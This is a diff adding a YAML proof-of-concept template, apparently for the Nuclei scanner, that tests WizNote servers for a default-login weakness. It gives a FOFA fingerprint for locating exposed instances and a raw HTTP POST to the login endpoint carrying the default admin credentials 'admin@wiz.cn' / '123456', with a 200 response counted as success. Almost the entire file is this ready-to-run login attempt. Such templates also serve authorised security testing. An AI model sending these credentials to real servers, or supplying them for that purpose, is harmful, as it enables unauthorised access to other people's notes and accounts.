@@ -1,0 +1,38 @@
+id: poc-yggbhvspe76kec85
+info:
+  name: 为知笔记login存在弱口令漏洞
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/yggbhvspe76kec85'
+  tags: default-login,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: yggbhvspe76kec85
+    fofa: title="WizNote"
+http:
+- raw:
+  - 'POST /as/user/login?clientType=web&clientVersion=4.0&lang=zh-cn HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36
+
+    Accept-Encoding: gzip, deflate
+
+    Accept: */*
+
+    Connection: close
+
+    Content-Type: application/json
+
+    Accept-Language: zh-CN,zh;q=0.9
+
+    Content-Length: 90
+
+
+    {"userId":"admin@wiz.cn","password":"123456","autoLogin":true,"domain":"","deviceId":null}'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
